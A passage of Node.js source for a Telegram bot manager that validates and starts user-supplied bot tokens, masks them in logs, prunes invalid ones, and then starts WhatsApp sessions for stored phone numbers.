bot.on('polling_error', (err) => {
  console.error('Polling error (root bot):', err.message);
  if (err.code === 'EFATAL' || err.response?.statusCode >= 500) {
    console.log('🛑 Serious polling error occurred.');
  } else {
    console.log('ℹ️ Minor polling error. Bot continues running.');
  }
});

async function initializeUserBots() {
  console.log(`Starting bot initialization. Current botTokens: ${db.botTokens.length} tokens found`);
  
  if (!Array.isArray(db.botTokens)) {
    console.error('db.botTokens is not an array, initializing as empty array');
    db.botTokens = [];
    saveJson('./database/bot_tokens.json', db.botTokens);
  }

  if (db.botTokens.length === 0) {
    console.log('No bot tokens found in bot_tokens.json');
    return;
  }

  const validTokens = [];
  for (const botToken of db.botTokens) {
    const maskedToken = botToken.slice(0, 10) + '...' + botToken.slice(-5);
    console.log(`Attempting to initialize bot with token: ${maskedToken}`);
    
    try {
      if (!/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(botToken)) {
        console.warn(`Invalid token format for token: ${maskedToken}`);
        continue;
      }

      const userBot = new TelegramBot(botToken, { polling: true });
      const botInfo = await userBot.getMe();
      
      if (!botInfo || !botInfo.username) {
        console.warn(`Invalid bot info for token: ${maskedToken}`);
        userBot.stopPolling();
        continue;
      }
      
      const botKey = `@${botInfo.username}`;
      if (botInstances.has(botKey)) {
        console.log(`Bot ${botKey} already initialized, skipping`);
        userBot.stopPolling();
        continue;
      }
      
      botInstances.set(botKey, userBot);
      registerCommandHandlers(userBot, false);
      validTokens.push(botToken);
      console.log(`Successfully initialized bot: ${botKey}`);
    } catch (error) {
      console.error(`Failed to initialize bot for token ${maskedToken}: ${error.message}`);
    }
  }

  if (validTokens.length !== db.botTokens.length) {
    db.botTokens = validTokens;
    saveJson('./database/bot_tokens.json', db.botTokens);
    console.log('Cleaned invalid tokens from bot_tokens.json');
  }
  
  console.log(`Bot initialization complete. Active bots: ${botInstances.size}`);
}

async function main() {
  try {
    console.log('✅ Telegram root bot started.');
    await initializeUserBots();
    console.log(`Root bot and ${botInstances.size - 1} user bots initialized`);
    for (const chatId in db.userNumbers) {
      const number = db.userNumbers[chatId];
      await startWhatsapp(number, bot);
    }
  } catch (error) {
    console.error('Error in main:', error.message);
  }
}

main();

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});